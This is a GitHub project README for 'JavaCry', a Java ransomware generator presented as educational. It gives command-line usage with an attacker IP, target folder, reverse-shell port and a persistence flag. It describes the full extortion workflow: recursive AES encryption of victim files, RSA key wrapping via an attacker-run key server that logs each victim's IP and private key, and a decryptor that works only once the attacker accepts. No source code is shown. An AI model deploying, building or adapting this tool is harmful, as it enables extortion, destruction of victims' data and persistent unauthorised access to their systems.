# JavaCry Java Ransomware Framework
**Warning: this project is for educational purpose only. Please make sure that the program encrypts the right directory. I do not take any responsibility of any damage.**

![image](https://github.com/acezxn/JavaCry/blob/main/images/YourFilesHaveBeenEncrypted.png)

### the project is still in development

It is a project to build a ransomware made with java. With the framwork, ransomware generation is automated.


## User guideline
* To run the JRF framework, move to JRF/Classes directory and run `java JRF` in terminal
* To run MainServer, which handles keys and decryption requests, move to JRF/Classes directory and run `java MainServer` in terminal

### Parameters:
* Target path: the path which the ransomware encrypts the files. Make sure it is **set to the right folder**. Leaving blank would mean that the ransomware would encrypt its local directory.
* Local IP: the attackers IP address
* Reverse shell: 
    * port: any port except 5555 and 6666, since these are the ports used by KeyServer and DecryptRequestHandler
    * persistence: Decryptor tries to configure the victim system so that the attacker's access would be persistent. This may be detected as some system has permission setting blocking this utility.

### One liner:
* `java JRF <IP> <TargetPath> <revPort> <persistence> <exportPath>`
Examples:
* `java JRF 192.168.68.21 /home /home/user/Desktop`
* `java JRF 192.168.68.21 /home 5678 /home/user/Desktop`
* `java JRF 192.168.68.21 /home 5678 persistence /home/user/Desktop`
Note: reverse shell and persistence are optional


## Features:

### JavaCry Functionality:
* It is the ransomware delivered to the victim.
* Creates a random number, as the victim’s identity.
* Hashes the number and sends it to the server.
* Receives its public key from the server for decryption.
* Creates 256 bit AES key, use the key to encrypt recursively in the target folder.
* Save key: encrypt the AES key with the public key, and save as Key_protected.key.
* Creates, compiles, and executes decryption.java.
* decryptor.java:
    * Opens a UI for decryption guideline
    * Shows a a button for sending decryption requests
    * Wait for the acceptance of DecryptRequestHandler
    * Decrypt files:
	    * Receives the private key
	    * Read Key_protected.key
	    * Decrypt Key_protected.key with the private key, get the AES key
	    * Use the AES key to recursively decrypt the target folder
    * Delete itself, Key_protected.key
 
### MainServer Functionality:
* It is the server that manages the victim's private keys and decryption requests.
* Commands:
    * clear: clear the screen
    * help: show help page
    * KS header: run KeyServer commands
    * DR header: run DecryptRequestHandler commands
    * KeyServer:
        * The server creates RSA key pairs for every victim, sending the public keys to the victim to encrypt the AES key used for file encryption.
        * For every client instance:
            * Creates a key pair, keep the private key
            * Receives the client’s id hash
            * Send public key to the client
            * Store the client’s IP, private key, and id hash in keys.csv
        * Commands:
            * help: show help page
            * off: turn of server, rejecting all requests
            * on: turn on server
            * reset: reset keys.csv
    * DecryptRequestHandler
		* Commands:
			* help: show help page
			* show: show authenticated clients
			* reject <idx>: reject a specific request
			* accept <idx> accept a specific request
			* off: turn of server, rejecting all requests
			* on: turn on server

## How it works
### Encryption
![image](https://github.com/acezxn/JavaCry/blob/main/images/JavaCry_Encryption.jpg)
### Decryption
![image](https://github.com/acezxn/JavaCry/blob/main/images/JavaCry_Decryption.jpg)